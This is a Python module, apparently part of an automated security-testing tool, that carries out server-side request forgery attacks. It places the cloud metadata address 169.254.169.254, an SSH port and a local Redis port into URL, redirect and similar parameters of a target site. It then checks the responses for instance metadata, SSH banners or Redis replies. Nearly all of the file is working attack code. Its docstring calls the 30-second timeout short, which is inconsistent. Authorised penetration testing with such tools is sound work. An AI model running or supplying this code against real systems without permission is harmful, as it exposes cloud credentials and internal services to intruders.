"""SSRF (Server-Side Request Forgery) 익스플로잇 executor."""
import logging
from typing import TypedDict

import httpx

logger = logging.getLogger(__name__)

# SSRF 탐지에 사용하는 내부 메타데이터 엔드포인트
_SSRF_PAYLOADS: tuple[str, ...] = (
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:22",
    "http://127.0.0.1:6379",
)

# SSRF 성공 시 응답에 포함될 수 있는 AWS 메타데이터 키워드
_METADATA_KEYWORDS: tuple[str, ...] = (
    "ami-id",
    "instance-id",
    "local-ipv4",
    "placement",
    "security-groups",
    "+ok",          # Redis PONG 응답
    "ssh-",         # SSH 배너
)

# URL 파라미터로 흔히 사용되는 키 이름
_URL_PARAM_KEYS: tuple[str, ...] = ("url", "redirect", "path", "fetch", "target", "href", "link")

_TIMEOUT_SECONDS = 30


class ExploitOutcome(TypedDict):
    success: bool
    payload: str
    response_snippet: str
    evidence: str
    error: str | None


def _find_url_param_key(params: dict) -> str:
    """params에서 SSRF 주입에 적합한 키를 찾는다. 없으면 첫 번째 키를 반환한다."""
    for key in _URL_PARAM_KEYS:
        if key in params:
            return key
    return next(iter(params), "url")


def _contains_metadata_keyword(body: str) -> bool:
    lower = body.lower()
    return any(kw in lower for kw in _METADATA_KEYWORDS)


async def execute(target_url: str, endpoint: str, params: dict) -> ExploitOutcome:
    """URL/redirect 계열 파라미터에 내부 메타데이터 주소를 주입하고 응답을 분석한다.

    200 응답이고 메타데이터 키워드가 포함되면 SSRF가 성공했다고 판단한다.
    타임아웃은 짧게 설정하여 내부 포트 스캐닝이 오래 걸리지 않도록 한다.
    """
    url = target_url.rstrip("/") + "/" + endpoint.lstrip("/")
    inject_key = _find_url_param_key(params)
    last_error: str | None = None

    async with httpx.AsyncClient(timeout=_TIMEOUT_SECONDS, follow_redirects=False) as client:
        for ssrf_url in _SSRF_PAYLOADS:
            injected_params = {**params, inject_key: ssrf_url}
            try:
                response = await client.get(url, params=injected_params)
                snippet = response.text[:500]

                if response.status_code == 200 and _contains_metadata_keyword(response.text):
                    return ExploitOutcome(
                        success=True,
                        payload=ssrf_url,
                        response_snippet=snippet,
                        evidence=(
                            f"Status 200 with metadata keyword in response body "
                            f"(injected via param '{inject_key}')"
                        ),
                        error=None,
                    )

            except httpx.HTTPError as exc:
                last_error = str(exc)
                logger.warning("[ssrf] request failed endpoint=%s payload=%s: %s", endpoint, ssrf_url, exc)

    return ExploitOutcome(
        success=False,
        payload=",".join(_SSRF_PAYLOADS),
        response_snippet="",
        evidence="No metadata keywords detected; SSRF not confirmed",
        error=last_error,
    )
